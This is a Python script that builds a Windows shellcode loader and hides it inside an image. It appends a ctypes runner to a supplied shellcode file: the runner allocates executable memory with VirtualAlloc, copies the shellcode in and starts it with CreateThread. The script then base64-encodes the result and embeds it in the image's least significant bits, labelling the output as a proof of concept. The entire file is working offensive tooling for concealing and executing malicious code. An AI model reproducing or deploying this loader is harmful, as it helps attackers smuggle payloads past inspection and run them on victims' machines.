from PIL import Image
import argparse
import base64

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--shellcode', required=True, help='Please supply file path to shellcode text file')
parser.add_argument('-i', '--image', required=True, help='Please supply file path to image file to be encoded')
args = parser.parse_args()

runner_string = """
import ctypes
shellcode = bytearray(buf)
pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                      ctypes.c_int(len(shellcode)),
                                      ctypes.c_int(0x3000),
                                      ctypes.c_int(0x40))
buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer),
                                 buffer,
                                 ctypes.c_int(len(shellcode)))
thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                     ctypes.c_int(0),
                                     ctypes.c_int(pointer),
                                     ctypes.c_int(0),
                                     ctypes.c_int(0),
                                     ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),
                                    ctypes.c_int(-1))"""

with open(args.shellcode, 'r') as shellcode:
    shellcode_in_text_file = shellcode.read().rstrip() + runner_string

# Encode the shellcode to base64
encoded_shellcode = base64.b64encode(shellcode_in_text_file.encode()).decode()

print(encoded_shellcode)

def text_to_binary(text_data):
    # Convert text data to binary format
    return ''.join(format(ord(char), '08b') for char in text_data)

def encode_lsb(image_path, plaintext_data, output_path):
    image = Image.open(image_path)
    
    # Convert the image to RGB mode (if it's not already)
    image = image.convert("RGB")

    width, height = image.size
    max_data_length = (width * height) * 3  # 3 channels (RGB) per pixel

    # Convert plaintext to binary format
    binary_data = text_to_binary(plaintext_data)

    # Append a special character to mark the end of the data
    binary_data += "00000000"  # Null character '\0'

    # Check if the data can fit into the image
    data_length = len(binary_data)
    if data_length > max_data_length:
        raise ValueError("Data too large for the image.")

    # Copy image
    encoded_image = image.copy()
    binary_index = 0

    # Embed binary data into the image using LSB steganography
    for y in range(height):
        for x in range(width):
            pixel = list(image.getpixel((x, y)))
            for channel in range(3):  # 3 channels (RGB)
                if binary_index < len(binary_data):
                    # Modify the least significant bit of the pixel
                    pixel[channel] = pixel[channel] & ~1 | int(binary_data[binary_index])
                    binary_index += 1
                else:
                    break
            encoded_image.putpixel((x, y), tuple(pixel))

    # Output
    encoded_image.save(output_path)
    print("Payload encoded and image saved to: poc_{}".format(image_path))

# Example usage:
if __name__ == "__main__":
    image_path = args.image
    encode_lsb(image_path, encoded_shellcode, "poc_{}".format(image_path))